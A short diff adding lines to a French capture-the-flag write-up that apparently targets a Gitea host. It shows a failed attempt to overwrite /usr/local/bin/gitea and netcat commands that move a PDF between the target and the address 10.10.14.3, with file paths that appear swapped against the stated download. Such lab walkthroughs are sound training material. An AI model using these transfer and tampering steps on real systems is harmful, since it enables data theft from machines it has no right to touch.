@@ -447,3 +447,10 @@ Cependant, un test rapide nous informe qu'il est impossible de modifier le fichi
 echo test > /usr/local/bin/gitea
 bash: line 19: /usr/local/bin/gitea: Text file busy
 ```
+
+Après avoir continué de chercher sans succès, on retourne dans le répertoire de junior.
+N'ayant pas encore exploré le fichier `Using OpenVAS.pdf`, on le télécharge pour y jeter un coup d'oeil:
+```bash
+nc -lvp 1234 > "/home/junior/Using OpenVAS.pdf"
+nc 10.10.14.3 1234 < "/home/kali/Using OpenVAS.pdf"
+```
